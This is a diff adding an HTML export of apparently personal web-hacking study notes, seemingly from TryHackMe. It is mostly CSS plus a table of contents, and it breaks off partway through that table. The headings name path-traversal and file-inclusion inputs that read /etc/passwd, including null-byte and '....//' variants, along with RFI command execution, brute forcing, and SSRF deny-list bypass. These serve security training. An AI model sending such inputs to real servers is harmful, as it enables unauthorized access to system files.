@@ -1,0 +1,680 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Introduction to Web Hacking</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="3aeb8fe4-0dad-4018-b370-333c1107fbc2" class="page sans"><header><img class="page-cover-image" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/03376575e888fd097280c51469c29fbc.png" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/walking-the-web.png"/></div><h1 class="page-title">Introduction to Web Hacking</h1></header><div class="page-body"><h1 id="3985fbb2-c018-4137-a4b4-2e62b26f3b30" class=""><mark class="highlight-yellow_background"><em>Contents Table</em></mark></h1><nav id="9d9f4a57-ad51-4690-b074-5ed50130a5fd" class="block-color-gray_background table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#3985fbb2-c018-4137-a4b4-2e62b26f3b30"><mark class="highlight-yellow_background"><em>Contents Table</em></mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#f7f96f79-3e1f-4545-bfd2-1b47b61ec120"><mark class="highlight-yellow_background"><em><strong>Walking An Application</strong></em></mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#4270903d-cb77-4cc5-9bee-224686d48e9f">Some important in-built browser tools:</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#9e45a55c-79ff-4efe-be26-a245276f8da5"><mark class="highlight-blue"><strong>View Source</strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#936228b1-395c-4dcd-a5c8-ac5e5c1a2b98"><mark class="highlight-blue"><strong>Inspector</strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5a8350eb-1bfe-4222-8cd7-68072b6b68bd"><mark class="highlight-blue"><strong>Sources - Debugger</strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6f58cdd8-4cfe-4a10-9b64-4962a96d72cd"><mark class="highlight-blue"><strong>Network</strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#98ce8543-23a4-4d7c-8ad6-29c8516e633e"><mark class="highlight-yellow_background"><em><strong>Content Discovery </strong></em></mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6bb82161-30bf-447c-9234-134ebc0bc2fa"><mark class="highlight-blue">Manually</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#5cd84c8a-b5b0-45d6-b8ec-ef0f3ed88244">robots.txt → <code>example.com/</code><span style="border-bottom:0.05em solid"><code>robots.txt</code></span></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e6342cef-452a-4182-acaa-d14928e10b00">Favicon → The <span style="border-bottom:0.05em solid">default icons</span> may show the website <span style="border-bottom:0.05em solid">Framework</span></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#2e6d1e68-432b-462a-b4bb-0f4582053cfe">Sitemap → <code>example.com/</code><code><span style="border-bottom:0.05em solid">sitemap.xml</span></code></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#88d48d29-12a3-4bf0-8e7e-decad1e0a175">HTTP Header → The server returns it when request him</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b5b4d6e0-314a-488a-b7d4-373bd776d516"><mark class="highlight-blue">OSINT (Open-Source Instance)</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#fbcbd5dc-c6a3-480b-af2c-a8ccbb0fe731">Google Hacking / Dorking</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#e6b8ea73-7d9a-47f7-87bb-5f0626ddfc6c"><strong>Wappalyzer</strong></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ac5dbe43-ae23-407d-a113-5da3d3ddcc56"><strong>Wayback Machine</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#45b88f74-1cc1-43b5-ad47-46202add29b9"><mark class="highlight-blue">Automated - Tools</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#769013e6-717a-4159-aec2-4db47e00086b">drib</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#6e9c717b-c2c4-486e-9dfe-4d9650b7e4e1">gobuster</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#61ae9806-0bb1-460e-a688-532f43f483f7"><em><mark class="highlight-yellow_background"><strong><strong>Subdomain Enumeration</strong></strong></mark></em></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#9f6955b7-0c59-4293-bab9-75d1b873fbab"><mark class="highlight-blue">OSINT</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#b32446ed-ae5d-44c9-bf88-f089b642beec"><strong>SSL/TLS Certificates</strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#8313a7c5-bb5c-4a8d-8c18-872606e3d3d6"><mark class="highlight-blue">Search Engines</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b82a3edd-d57c-4d84-b62a-29cb4b6ed29e"><mark class="highlight-blue">dnsreacon</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#3a2a6787-c221-4b45-9a76-8269272b7c5d"><mark class="highlight-blue">Sublist3r</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#00069e86-c11a-46d6-b243-aac38d90eb55"><mark class="highlight-blue">Virtual Hosts</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#2229aee2-3003-486a-bc02-438b567866d7"><strong><mark class="highlight-red">FFUF</mark></strong></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#7d5493ed-550f-4eff-b6cf-0e835d2a9b05"><strong><mark class="highlight-yellow_background"><em>Authentication Bypass</em></mark></strong></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#69b8cc66-b294-4f2e-89e8-ea2ea9e476b9"><mark class="highlight-blue">Username Enumeration</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ed98c1a2-1011-4907-b567-eb97554b3886"><mark class="highlight-red">With FFUF</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#41904720-9699-4297-9a19-a1f90ad2de32"><mark class="highlight-blue">Brute Force</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#a0b1fe77-df13-4cdf-8252-47895c8f1435"><mark class="highlight-red">With FFUF</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#fa0eaf11-0cc6-4a8a-8455-151bd018cd34"><em><mark class="highlight-yellow_background">IDOR (Insecure Direct Object Reference)</mark></em></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#00984327-4d06-4b82-8ea5-7d1a3700511a"><mark class="highlight-blue">Try changing the user id value: </mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#8b61d5a0-97f9-4f11-a61e-c1ca8d4a8201"><mark class="highlight-blue">IDORs in encoded IDs</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e1ff37e9-769a-4401-84ea-7da15b6a8252"><mark class="highlight-blue">Hashed IDs</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#646eaa5b-7174-4126-b2aa-9b5b55772f6c"><mark class="highlight-blue"><strong><strong>Unpredictable IDs</strong></strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#e787346c-d1c2-44bc-a161-a4f95103284f"><em><mark class="highlight-yellow_background"><strong>File Inclusion</strong></mark></em></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#881a8dc1-c65b-4b5e-a91c-932dc8d73556"><mark class="highlight-blue"><strong>Path Traversal</strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ace4d55a-6b5f-45a5-ba7a-eb01b065a26c"><mark class="highlight-blue">LFI - Local File Inclusion</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#c39576e0-26e5-402c-ac6f-1eb86d6ff4a8">1. <code>Including: /etc/passwd</code></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#8e0ded92-debb-4c78-ae9a-689c1a4738c5">2. <code>Including: ../../../../etc/passwd</code></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#652e516e-1841-4794-b8ce-580202f22cbd">3. <code>Including: /etc/passwd</code><mark class="highlight-red"><strong><code>%00</code></strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#ea4dd23e-5a08-4bcd-a483-dc4026e6a396">4. <code>Including: /etc/passwd</code><mark class="highlight-red"><strong><code>/.</code></strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#19e97fd9-b50a-45de-ac83-0d12f2c273b5">5. <code>Including: </code><mark class="highlight-red"><strong><code>....//....//....//....//....//etc/passwd</code></strong></mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#117993f1-4aa5-4449-a016-522ea83273c6">6. <code>Including: </code><mark class="highlight-red"><strong><code>directory/</code></strong></mark><code>../../../../etc/passwd</code></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#910bb893-9d16-4d3f-9a2a-c4ccb1441a2d"><mark class="highlight-blue">RFI - Remote File Inclusion</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#07367017-661a-483b-8b3b-c9c41408b59c">RFI steps</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#589f81de-c313-4676-9436-b008f21d5fa9">RFI Example\ Execute ‘hostname’ command on the server shell:</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#df72f688-2ec7-42f8-bd89-40bc713c4ebc"><mark class="highlight-blue">Remediation</mark></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#5fce6432-b85a-48b9-a406-bd1db00725f0"><mark class="highlight-blue">Sometimes</mark> <mark class="highlight-blue">you need to try:</mark></a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#7aa6815e-d2c8-415a-9cb7-1fd8fe0c82dc"><em><mark class="highlight-yellow_background">SSRF (Server-Side Request Forgery)</mark></em></a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#b1025991-9bac-4667-a4a1-6c270260411f">Types of SSRF</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#2ce2c672-c7ef-4b17-8bf3-bd08e7a0a7c8">What&#x27;s the impact?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c0da3e5b-31f6-4f7c-97dc-41fd0c4914a5"><mark class="highlight-blue">Finding an SSRF</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#4904cb55-0472-4e77-a57b-1ff8411e8ba4">When a full URL is used in a parameter in the address bar:</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#bebc98f2-fc15-40cf-a7c1-07a96b46aab0">A hidden field in a form:</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#3d71c3d8-20cc-4103-af6d-2c9688a59ee8">A partial URL such as just the hostname:</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#d793fd28-17f9-4d47-b2ff-8ccfd3a1b379">Or perhaps only the path of the URL:</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#f6e29b48-8814-4015-83a0-f9441e3d117a"><mark class="highlight-blue">Defeating Common SSRF Defenses</mark></a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#00531fb2-9cee-4833-b3a9-8fc4504f6f58">Deny List </a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" 